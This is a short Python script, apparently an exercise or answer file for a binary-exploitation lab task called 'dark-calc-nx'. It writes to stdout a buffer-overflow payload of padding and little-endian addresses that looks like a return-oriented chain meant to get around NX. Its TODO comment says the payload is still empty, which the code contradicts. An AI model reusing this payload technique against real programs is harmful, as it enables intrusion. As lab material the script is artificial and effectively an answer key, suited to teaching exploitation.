#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b'\x11' + b'\x00' * 23 + b'\x33\x1a\x40\x00\x00\x00\x00\x00' + b'\x04\x00\x00\x00\x00\x00\x00\x00' + b'\x77\x19\x40\x00\x00\x00\x00\x00' + b'\x78\x19\x40\x00\x00\x00\x00\x00' + b'\xc2\x19\x40\x00\x00\x00\x00'

sys.stdout.buffer.write(payload)
